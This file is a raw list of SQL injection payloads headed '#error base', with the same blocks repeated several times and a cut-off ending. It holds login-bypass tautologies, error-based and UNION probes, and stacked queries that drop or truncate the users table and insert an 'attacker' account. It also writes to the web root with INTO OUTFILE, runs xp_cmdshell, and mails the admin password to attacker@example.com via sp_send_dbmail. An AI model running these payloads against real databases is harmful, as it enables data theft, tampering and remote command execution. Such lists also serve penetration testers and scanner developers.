#error base
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
FAPyElFB';get-help
FAPyElFB';get-help
' OR 'a'='a
' OR 'a'='b
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
